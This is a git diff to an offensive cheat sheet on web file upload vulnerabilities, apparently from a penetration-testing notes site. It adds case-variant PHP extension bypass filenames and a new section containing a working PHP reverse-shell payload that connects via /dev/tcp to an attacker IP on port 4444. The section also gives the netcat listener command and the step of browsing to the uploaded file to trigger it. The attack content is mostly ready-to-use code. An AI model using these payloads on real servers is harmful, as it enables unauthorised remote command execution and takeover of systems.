@@ -1,7 +1,7 @@
 ---
 title: File Upload Vulnerabilities
 desc: Examples of File Upload Vulnerabilities.
-tags: [FileUpload, Web]
+tags: [FileUpload, ReverseShell, Web]
 alts: []
 website:
 render_with_liquid: false
@@ -68,6 +68,8 @@ exploit%2Ephp
 exploit.p.phphp
 exploit.php%00.jpg
 exploit.php%0d%0a.jpg
+exploit.pHp
+exploit.gif.pHp
 ```
 
 <br />
@@ -141,6 +143,24 @@ Connection: close
 
 def handleResponse(req, interesting):
     table.add(req)
+```
+
+<br />
+
+## Reverse Shell
+
+```php
+// Upload reverse_shell.php to the upload form
+<?php shell_exec("/bin/bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'"); ?>
+
+// -------------------------------------
+
+// Listening port on the attack machine...
+nc -lvnp 4444
+
+// ----------------------------------------
+
+Access to http://vulnerable.com/path/to/upload/reverse_shell.php in browser.
 ```
 
 <br />
